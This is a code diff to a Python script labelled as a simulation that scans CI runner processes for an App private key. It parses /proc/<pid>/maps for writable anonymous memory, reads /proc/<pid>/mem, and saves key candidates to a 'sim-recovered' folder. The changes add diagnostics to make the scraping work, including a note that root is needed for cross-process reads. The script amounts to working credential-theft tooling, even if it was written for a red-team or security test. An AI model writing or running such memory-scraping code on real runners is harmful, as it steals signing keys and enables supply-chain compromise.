@@ -35,19 +35,21 @@ def comm(pid):
 
 def rw_regions(pid):
     out = []
+    lines = 0
     try:
         with open(f"/proc/{pid}/maps") as f:
             for line in f:
-                m = re.match(r'([0-9a-f]+)-([0-9a-f]+) (r)([w-])([p-]) \S+ \S+ \S+\s*(\S*)$', line.strip())
-                if not m or m.group(4) != 'w':
-                    continue
-                path = m.group(6)
+                lines += 1
+                m = re.match(r'([0-9a-f]+)-([0-9a-f]+) ([r-][w-][xs-][ps]) \S+ \S+ \S+\s*(\S*)$', line.strip())
+                if not m or m.group(3)[1] != 'w':
+                    continue  # secrets live in rw regions; read-only mapped files are noise
+                path = m.group(4)
                 if path.startswith("/") or path.startswith("["):
                     continue  # file-backed/vvar are noise; secrets live in anon heap
                 out.append((int(m.group(1), 16), int(m.group(2), 16)))
     except OSError:
         pass
-    return out
+    return out, lines
 
 def read_region(fd, start, end):
     data = b""
@@ -84,6 +86,7 @@ def candidates_in(buf):
 
 def main():
     print("== SIM: scanning runner processes for the App private key ==")
+    print(f"  uid={os.getuid()} (need 0 for cross-process /proc/<pid>/mem)")
     pids = sorted(int(os.path.basename(p)) for p in glob.glob("/proc/[0-9]*"))
     runner = [p for p in pids if comm(p).startswith("Runner.")]
     others = [p for p in pids if p not in runner]
@@ -92,12 +95,17 @@ def main():
     os.makedirs("sim-recovered", exist_ok=True)
     seen, meta, scanned = set(), [], 0
     for pid in runner + others:
+        regions, nlines = rw_regions(pid)
+        if pid in runner:
+            print(f"  diag pid={pid} ({comm(pid)}): maps lines={nlines}, rw anon regions={len(regions)}")
         try:
             fd = os.open(f"/proc/{pid}/mem", os.O_RDONLY)
-        except OSError:
+        except OSError as e:
+            if pid in runner:
+                print(f"  diag pid={pid}: mem open failed: {e}")
             continue
         try:
-            for start, end in rw_regions(pid):
+            for start, end in regions:
                 scanned += 1
                 for blob in candidates_in(read_region(fd, start, end)):
                     sha = hashlib.sha256(blob).hexdigest()
